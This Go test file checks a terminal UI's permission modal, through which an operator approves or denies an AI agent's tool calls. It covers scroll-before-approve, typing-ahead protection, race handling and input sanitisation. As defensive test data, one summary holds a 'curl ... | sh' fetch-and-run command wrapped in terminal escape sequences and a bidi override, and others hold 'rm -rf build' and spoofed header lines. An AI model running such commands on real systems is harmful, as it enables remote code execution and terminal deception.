package tui

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"testing"
	"time"

	tea "github.com/charmbracelet/bubbletea"

	"github.com/softwaresalt/intercom-go/internal/agent"
	"github.com/softwaresalt/intercom-go/internal/hub"
)

// permAsk plays the adapter's permission handler for tests: it posts an ask to
// the hub, and handle() receives the hub's decision, records it as delivered
// and marks the handler returned, exactly as the real handler does.
type permAsk struct {
	ask      agent.PermissionAsk
	reply    chan agent.PermissionDecision
	outcome  *agent.PermissionOutcome
	resolved chan struct{}
}

func newPermAsk(kind agent.PermissionKind, summary string) *permAsk {
	reply := make(chan agent.PermissionDecision, 1)
	resolved := make(chan struct{})
	outcome := &agent.PermissionOutcome{}
	return &permAsk{
		reply: reply, outcome: outcome, resolved: resolved,
		ask: agent.PermissionAsk{
			Request:  agent.PermissionRequest{ToolCallID: "call-1", Kind: kind, RawKind: "x", Summary: summary},
			Reply:    reply,
			Outcome:  outcome,
			Resolved: resolved,
		},
	}
}

func (a *permAsk) post(t *testing.T, h *hub.Hub) {
	t.Helper()
	select {
	case h.Asks() <- a.ask:
	case <-time.After(testWait):
		t.Fatal("timed out posting ask")
	}
}

func (a *permAsk) handle(t *testing.T) agent.PermissionDecision {
	t.Helper()
	select {
	case d := <-a.reply:
		a.outcome.Deliver(d)
		close(a.resolved)
		return d
	case <-time.After(testWait):
		t.Fatal("hub never sent a decision to the handler")
		return agent.PermissionDecision{}
	}
}

func longSummary(lines int) string {
	var b strings.Builder
	for i := 1; i <= lines; i++ {
		fmt.Fprintf(&b, "step %d: run something harmless\n", i)
	}
	return strings.TrimRight(b.String(), "\n")
}

// modalModel brings up a model with one pending permission on a real hub.
func modalModel(t *testing.T, ing Ingress, kind agent.PermissionKind, summary string, w, h int) (Model, *rig, *permAsk) {
	t.Helper()
	r := newRig(t, hub.Config{})
	m := newModel(t, ing, w, h)
	m = r.feedFrames(m, 1)
	a := newPermAsk(kind, summary)
	a.post(t, r.h)
	m = r.untilKind(m, hub.KindPermissionRequested)
	if len(m.pending) != 1 {
		t.Fatalf("expected one pending permission, got %d", len(m.pending))
	}
	return m, r, a
}

func scrollModalToEnd(t *testing.T, m Model) Model {
	t.Helper()
	for i := 0; i < 500 && !m.approvable(); i++ {
		m, _ = step(m, tea.KeyMsg{Type: tea.KeyPgDown})
	}
	if !m.approvable() {
		t.Fatal("modal never became approvable after scrolling to the end")
	}
	return m
}

func TestModalShowsRequestAndApproveGoesThroughIngress(t *testing.T) {
	ing := &fakeIngress{result: hub.ActionResult{Accepted: true}}
	m, _, _ := modalModel(t, ing, agent.PermissionKindShell, "git status --short", 70, 16)
	golden(t, "modal", view(m))

	m, cmd := step(m, keyRunes("y"))
	if cmd != nil {
		t.Fatal("first y only arms the approval")
	}
	if !strings.Contains(view(m), "Enter") {
		t.Fatalf("armed state must tell the operator how to confirm:\n%s", view(m))
	}
	m, cmd = step(m, tea.KeyMsg{Type: tea.KeyEnter})
	if cmd == nil || len(ing.snapshot()) != 0 {
		t.Fatal("confirm must return a Cmd and not call the ingress inside Update")
	}
	cmd()
	calls := ing.snapshot()
	if len(calls) != 1 || calls[0].Type != hub.OpResolvePermission ||
		calls[0].Decision.Kind != agent.DecisionAllowOnce || calls[0].RequestID != m.pending[0].RequestID {
		t.Fatalf("unexpected ingress calls: %+v", calls)
	}
}

func TestDenyIsImmediateAndGoesThroughIngress(t *testing.T) {
	ing := &fakeIngress{result: hub.ActionResult{Accepted: true}}
	m, _, _ := modalModel(t, ing, agent.PermissionKindShell, "rm -rf build", 70, 16)
	_, cmd := step(m, keyRunes("n"))
	if cmd == nil {
		t.Fatal("n must deny")
	}
	cmd()
	calls := ing.snapshot()
	if len(calls) != 1 || calls[0].Decision.Kind != agent.DecisionDeny {
		t.Fatalf("want one deny, got %+v", calls)
	}
}

func TestAccidentalTypingCannotApprove(t *testing.T) {
	ing := &fakeIngress{result: hub.ActionResult{Accepted: true}}
	m, _, _ := modalModel(t, ing, agent.PermissionKindShell, "ls", 70, 16)
	// An operator mid-sentence types "yes\n" when the modal pops up.
	for _, k := range []tea.Msg{keyRunes("y"), keyRunes("e"), keyRunes("s"), tea.KeyMsg{Type: tea.KeyEnter}} {
		var cmd tea.Cmd
		m, cmd = step(m, k)
		if cmd != nil {
			t.Fatalf("%#v produced a Cmd; typing ahead must never resolve a permission", k)
		}
	}
	if len(ing.snapshot()) != 0 {
		t.Fatal("ingress was called")
	}
	if len(m.input) != 0 {
		t.Fatalf("keys typed at a modal must not leak into the prompt: %q", string(m.input))
	}
}

func TestLongRequestIsScrollableAndApproveRefusedUntilFullyViewed(t *testing.T) {
	ing := &fakeIngress{result: hub.ActionResult{Accepted: true}}
	m, _, _ := modalModel(t, ing, agent.PermissionKindShell, longSummary(60), 70, 16)
	v := view(m)
	if !strings.Contains(v, "step 1:") || strings.Contains(v, "step 60:") {
		t.Fatalf("modal should start at the top of a long request:\n%s", v)
	}
	if m.approvable() {
		t.Fatal("a request that is not fully on screen must not be approvable")
	}
	m, cmd := step(m, keyRunes("y"))
	m, cmd2 := step(m, tea.KeyMsg{Type: tea.KeyEnter})
	if cmd != nil || cmd2 != nil || len(ing.snapshot()) != 0 {
		t.Fatal("approve must be refused before the whole request has been viewed")
	}
	if !strings.Contains(view(m), "scroll") {
		t.Fatalf("refusal must explain itself:\n%s", view(m))
	}
	// Jumping to the end must not count as having read the middle.
	m, _ = step(m, tea.KeyMsg{Type: tea.KeyEnd})
	if m.approvable() {
		t.Fatal("End must not unlock approve")
	}
	// Deny is always available.
	if _, cmd = step(m, keyRunes("n")); cmd == nil {
		t.Fatal("deny must stay available")
	}

	m = scrollModalToEnd(t, m)
	if v := view(m); !strings.Contains(v, "step 60:") {
		t.Fatalf("end of request never shown:\n%s", v)
	}
	m, _ = step(m, keyRunes("y"))
	_, cmd = step(m, tea.KeyMsg{Type: tea.KeyEnter})
	if cmd == nil {
		t.Fatal("approve should be allowed after the full request was viewed")
	}
}

func TestEveryLineOfALongRequestIsShownWhileScrolling(t *testing.T) {
	m, _, _ := modalModel(t, &fakeIngress{}, agent.PermissionKindShell, longSummary(40), 70, 20)
	var shown strings.Builder
	for i := 0; i < 200; i++ {
		shown.WriteString(view(m))
		if m.approvable() {
			break
		}
		m, _ = step(m, tea.KeyMsg{Type: tea.KeyPgDown})
	}
	for i := 1; i <= 40; i++ {
		want := fmt.Sprintf("step %d: run something harmless", i)
		if !strings.Contains(shown.String(), want) {
			t.Fatalf("line %q was never displayed before approve unlocked", want)
		}
	}
}

func TestTinyTerminalIsDenyOnly(t *testing.T) {
	ing := &fakeIngress{result: hub.ActionResult{Accepted: true}}
	m, _, _ := modalModel(t, ing, agent.PermissionKindShell, "ls", 70, 16)
	m, _ = step(m, tea.WindowSizeMsg{Width: 70, Height: 6})
	if m.approvable() {
		t.Fatal("a terminal too small to show the request must not allow approval")
	}
	if _, cmd := step(m, keyRunes("n")); cmd == nil {
		t.Fatal("deny must still work")
	}
}

// twoPending builds a model with request "A" (short) ahead of "B" (long, so B
// needs scrolling before it can be approved).
func twoPending(t *testing.T, ing Ingress) Model {
	t.Helper()
	m := newModel(t, ing, 70, 16)
	m.pending = []permission{
		newPermission(hub.PermissionRequestedPayload{RequestID: "A", ToolCallID: "ca", PermissionKind: "shell", Summary: "BODY-OF-A"}, time.Time{}),
		newPermission(hub.PermissionRequestedPayload{RequestID: "B", ToolCallID: "cb", PermissionKind: "shell", Summary: "BODY-OF-B\n" + longSummary(40)}, time.Time{}),
	}
	m.syncModal(true)
	return m
}

func TestActionResultDroppingHeadSynchronizesModal(t *testing.T) {
	results := map[string]hub.ActionResult{
		"already_resolved": {Reason: hub.ReasonAlreadyResolved, Winner: hub.ActorRemoteApprover},
		"request_unknown":  {Reason: hub.ReasonRequestUnknown},
	}
	for name, res := range results {
		t.Run(name, func(t *testing.T) {
			ing := &fakeIngress{result: hub.ActionResult{Accepted: true}}
			m := twoPending(t, ing)
			m, _ = step(m, ActionResultMsg{
				Action: hub.OperatorAction{Type: hub.OpResolvePermission, RequestID: "A"},
				Result: res,
			})
			if len(m.pending) != 1 || m.pending[0].RequestID != "B" {
				t.Fatalf("pending = %+v, want only B", m.pending)
			}
			if m.modalFor != "B" {
				t.Fatalf("modalFor = %q, want B (modal not synchronized)", m.modalFor)
			}
			v := view(m)
			if !strings.Contains(v, "BODY-OF-B") || strings.Contains(v, "BODY-OF-A") {
				t.Fatalf("modal shows the wrong body:\n%s", v)
			}
			if m.approvable() {
				t.Fatal("B must not be approvable before it has been fully seen")
			}
			// Typed-ahead approval of an unseen B must be refused.
			m2, _ := step(m, keyRunes("y"))
			if _, cmd := step(m2, tea.KeyMsg{Type: tea.KeyEnter}); cmd != nil {
				t.Fatal("unseen B was approved")
			}
			// Deny targets the displayed request.
			if _, cmd := step(m, keyRunes("n")); cmd == nil {
				t.Fatal("deny must work")
			} else if msg, ok := cmd().(ActionResultMsg); !ok || msg.Action.RequestID != "B" {
				t.Fatalf("deny targeted %+v, want B", msg.Action)
			}
			// Once B is fully seen, approval targets B.
			m = scrollModalToEnd(t, m)
			m, _ = step(m, keyRunes("y"))
			_, cmd := step(m, tea.KeyMsg{Type: tea.KeyEnter})
			if cmd == nil {
				t.Fatal("seen B should be approvable")
			}
			msg, ok := cmd().(ActionResultMsg)
			if !ok || msg.Action.RequestID != "B" || msg.Action.Decision.Kind != agent.DecisionAllowOnce {
				t.Fatalf("approval = %+v, want AllowOnce for B", msg.Action)
			}
		})
	}
}

func TestResizeBelowViewMinimumIsDenyOnly(t *testing.T) {
	cases := map[string][2]int{
		"width-only":  {minWidth - 1, 16},
		"height-only": {70, minHeight - 1},
	}
	for name, size := range cases {
		t.Run(name, func(t *testing.T) {
			ing := &fakeIngress{result: hub.ActionResult{Accepted: true}}
			m := newModel(t, ing, 70, 16)
			m.pending = []permission{newPermission(hub.PermissionRequestedPayload{RequestID: "r1", ToolCallID: "c", PermissionKind: "shell", Summary: "ls"}, time.Time{})}
			m.syncModal(true)
			if !m.approvable() {
				t.Fatal("short request should be approvable at 70x16")
			}
			m, _ = step(m, tea.WindowSizeMsg{Width: size[0], Height: size[1]})
			if !strings.Contains(m.View(), "too small") {
				t.Fatalf("View should report too small:\n%s", m.View())
			}
			if m.approvable() {
				t.Fatal("approvable while View does not render the modal")
			}
			m, _ = step(m, keyRunes("y"))
			if _, cmd := step(m, tea.KeyMsg{Type: tea.KeyEnter}); cmd != nil {
				t.Fatal("y+Enter approved an unseen request")
			}
			if _, cmd := step(m, keyRunes("n")); cmd == nil {
				t.Fatal("deny must still work")
			}
			// Restoring the size restarts reading: the request was never shown.
			m, _ = step(m, tea.WindowSizeMsg{Width: 70, Height: 16})
			if m.modalSeen > m.modal.Height {
				t.Fatalf("reading state not reset on resize: seen=%d", m.modalSeen)
			}
			if !strings.Contains(view(m), "Permission request") {
				t.Fatalf("modal not shown after restoring size:\n%s", view(m))
			}
		})
	}
}

func TestBlankSummaryIsDenyOnly(t *testing.T) {
	for _, summary := range []string{"", "  \n\t ", "\u3164", "\u2800", "\u200b", "\ufffd", "\ue000\n\t"} {
		ing := &fakeIngress{result: hub.ActionResult{Accepted: true}}
		m := newModel(t, ing, 70, 16)
		m.pending = []permission{newPermission(hub.PermissionRequestedPayload{RequestID: "r1", ToolCallID: "c", PermissionKind: "shell", Summary: summary}, time.Time{})}
		m.syncModal(true)
		for i := 0; i < 5; i++ {
			m, _ = step(m, tea.KeyMsg{Type: tea.KeyPgDown})
		}
		if m.approvable() {
			t.Fatalf("blank summary %q must not be approvable", summary)
		}
		if !strings.Contains(view(m), "(empty request - deny only)") {
			t.Fatalf("blank request not flagged:\n%s", view(m))
		}
		m, _ = step(m, keyRunes("y"))
		if _, cmd := step(m, tea.KeyMsg{Type: tea.KeyEnter}); cmd != nil {
			t.Fatal("enter after y must not approve a blank request")
		}
		if _, cmd := step(m, keyRunes("n")); cmd == nil {
			t.Fatal("deny must still work")
		}
	}
}

func TestPermissionSummaryIsIndentedAgainstNewlineAndSoftWrapHeaderSpoofing(t *testing.T) {
	inner := 36
	cases := map[string]string{
		"newline":   "ls\nkind: EVIL\ntool call: EVIL",
		"soft wrap": strings.Repeat("x", inner-5) + " kind: EVIL tool call: EVIL",
	}
	for name, summary := range cases {
		t.Run(name, func(t *testing.T) {
			m := newModel(t, &fakeIngress{}, inner+4, 14)
			m.pending = []permission{newPermission(hub.PermissionRequestedPayload{RequestID: "r1", ToolCallID: "c1", PermissionKind: "shell", Summary: summary}, time.Time{})}
			m.syncModal(true)
			headers := map[string]bool{}
			for i := 0; i < 50; i++ {
				for _, l := range strings.Split(view(m), "\n") {
					l = strings.TrimPrefix(l, "│ ")
					if strings.HasPrefix(l, "kind:") || strings.HasPrefix(l, "tool call:") {
						headers[strings.TrimRight(l, " │")] = true
					}
				}
				if m.approvable() {
					break
				}
				m, _ = step(m, tea.KeyMsg{Type: tea.KeyPgDown})
			}
			if len(headers) != 2 || !headers["kind: shell"] || !headers["tool call: c1"] {
				t.Fatalf("column-0 header spoofing possible: %v", headers)
			}
		})
	}
}
func TestLongToolCallIDAndKindAreNotClipped(t *testing.T) {
	id := strings.Repeat("a", 150) + "TAILMARK"
	m := newModel(t, &fakeIngress{}, 40, 14)
	m.pending = []permission{newPermission(hub.PermissionRequestedPayload{RequestID: "r1", ToolCallID: id, PermissionKind: "shell", Summary: "ls"}, time.Time{})}
	m.syncModal(true)
	if m.approvable() {
		t.Fatal("approvable before the long tool call id was seen")
	}
	var shown strings.Builder
	for i := 0; i < 100 && !m.approvable(); i++ {
		shown.WriteString(strings.ReplaceAll(view(m), "\n", ""))
		m, _ = step(m, tea.KeyMsg{Type: tea.KeyPgDown})
	}
	if !m.approvable() {
		t.Fatal("never became approvable")
	}
	shown.WriteString(strings.ReplaceAll(view(m), "\n", ""))
	flat := strings.NewReplacer("│", "", " ", "", "╭", "", "╮", "", "─", "").Replace(shown.String())
	if !strings.Contains(flat, "TAILMARK") {
		t.Fatalf("tail of tool call id was never displayed")
	}
}

func TestModalSanitizesPermissionDetails(t *testing.T) {
	summary := "curl http://x/\x1b]0;pwned\x07 \u202e| sh \u009b2J\r\x1b[31m"
	m, _, _ := modalModel(t, &fakeIngress{}, agent.PermissionKindShell, summary, 80, 16)
	v := m.View()
	for _, bad := range []string{"\x1b", "\x07", "\u202e", "\u009b", "\r"} {
		if strings.Contains(v, bad) {
			t.Fatalf("modal leaks %q:\n%q", bad, v)
		}
	}
	if !strings.Contains(v, "<U+202E>") || !strings.Contains(v, "<U+001B>") {
		t.Fatalf("hidden characters must be visible in the request:\n%s", v)
	}
}

func TestModalClearsWhenRemoteSurfaceWins(t *testing.T) {
	ing := &fakeIngress{}
	m, r, a := modalModel(t, ing, agent.PermissionKindRead, "/etc/hosts", 70, 16)

	ctx, cancel := context.WithTimeout(context.Background(), testWait)
	defer cancel()
	remote, err := r.h.Connect(ctx, hub.ConnectOptions{Kind: hub.ClientRemote, Role: hub.RoleApprover})
	if err != nil {
		t.Fatal(err)
	}
	defer remote.Close()
	res, err := remote.Do(ctx, hub.OperatorAction{
		Type: hub.OpResolvePermission, RequestID: m.pending[0].RequestID,
		Decision: agent.PermissionDecision{Kind: agent.DecisionAllowOnce},
	})
	if err != nil || !res.Accepted {
		t.Fatalf("remote approve: %+v %v", res, err)
	}
	a.handle(t)
	m = r.untilKind(m, hub.KindPermissionResolved)

	if len(m.pending) != 0 {
		t.Fatal("modal must clear when another surface wins the arbitration")
	}
	v := view(m)
	if !strings.Contains(v, hub.ActorRemoteApprover) {
		t.Fatalf("operator must be told who won:\n%s", v)
	}
	if strings.Contains(v, "Permission request") {
		t.Fatalf("modal still rendered:\n%s", v)
	}
	if len(ing.snapshot()) != 0 {
		t.Fatal("clearing a modal must not cause any action")
	}
}

func TestLosingTheRaceShowsWinnerAndClears(t *testing.T) {
	ing := &fakeIngress{result: hub.ActionResult{Reason: hub.ReasonAlreadyResolved, Winner: hub.ActorRemoteApprover}}
	m, _, _ := modalModel(t, ing, agent.PermissionKindRead, "/tmp/x", 70, 16)
	m, cmd := step(m, keyRunes("n"))
	m, _ = step(m, cmd())
	if len(m.pending) != 0 {
		t.Fatal("already_resolved must clear the modal")
	}
	if !strings.Contains(view(m), hub.ActorRemoteApprover) {
		t.Fatalf("winner not shown:\n%s", view(m))
	}
}

func TestPermissionAbortClearsModal(t *testing.T) {
	m, r, a := modalModel(t, &fakeIngress{}, agent.PermissionKindRead, "/tmp/x", 70, 16)
	close(a.resolved) // handler gone without a decision: the hub aborts the request
	m = r.untilKind(m, hub.KindPermissionAborted)
	if len(m.pending) != 0 {
		t.Fatal("aborted request must clear the modal")
	}
}

func TestPendingPermissionShownAfterRehydrate(t *testing.T) {
	m, r, _ := modalModel(t, &fakeIngress{}, agent.PermissionKindShell, "make test", 70, 16)
	id := m.pending[0].RequestID

	// A brand-new model (TUI restart / overflow re-hydrate) learns the request
	// from the hydrate alone. A remote surface stays attached meanwhile: with
	// the broadcast set empty the hub would resolve the request at once.
	ctx, cancel := context.WithTimeout(context.Background(), testWait)
	defer cancel()
	keeper, err := r.h.Connect(ctx, hub.ConnectOptions{Kind: hub.ClientRemote, Role: hub.RoleObserver})
	if err != nil {
		t.Fatal(err)
	}
	defer keeper.Close()
	r.c.Close()
	r.c = r.connect()
	fresh := newModel(t, &fakeIngress{}, 70, 16)
	fresh, _ = step(fresh, FrameMsg{Frame: r.frame()})
	if len(fresh.pending) != 1 || fresh.pending[0].RequestID != id {
		t.Fatalf("hydrate lost the pending permission: %+v", fresh.pending)
	}
	if !strings.Contains(view(fresh), "make test") {
		t.Fatalf("modal not rendered after hydrate:\n%s", view(fresh))
	}

	// And a hydrate that no longer lists it clears a stale modal.
	empty := newRig(t, hub.Config{})
	m, _ = step(m, FrameMsg{Frame: empty.frame()})
	if len(m.pending) != 0 {
		t.Fatal("hydrate is authoritative: an absent request must clear the modal")
	}
}

func TestDecodeFailureOfPermissionIsVisible(t *testing.T) {
	m := newModel(t, &fakeIngress{}, 70, 16)
	m = m.applyPermissionRequested(json.RawMessage(`{"request_id": 5}`), time.Time{})
	if !strings.Contains(view(m), "undecodable") {
		t.Fatalf("undecodable permission request must be flagged:\n%s", view(m))
	}
	if len(m.pending) != 0 {
		t.Fatal("an undecodable request must never become approvable")
	}
}

func TestEndToEndApproveReachesAgentHandler(t *testing.T) {
	r := newRig(t, hub.Config{RemoteApproveDestructive: false})
	m := newModel(t, r.c, 70, 16)
	m = r.feedFrames(m, 1)
	a := newPermAsk(agent.PermissionKindShell, "go test ./...")
	a.post(t, r.h)
	m = r.untilKind(m, hub.KindPermissionRequested)

	m, _ = step(m, keyRunes("y"))
	m, cmd := step(m, tea.KeyMsg{Type: tea.KeyEnter})
	if cmd == nil {
		t.Fatal("no cmd")
	}
	m, _ = step(m, cmd())
	if d := a.handle(t); d.Kind != agent.DecisionAllowOnce {
		t.Fatalf("handler got %+v", d)
	}
	m = r.untilKind(m, hub.KindPermissionResolved)
	if len(m.pending) != 0 || !strings.Contains(view(m), hub.ActorLocalTUI) {
		t.Fatalf("resolved by the local TUI should clear and say so:\n%s", view(m))
	}
}
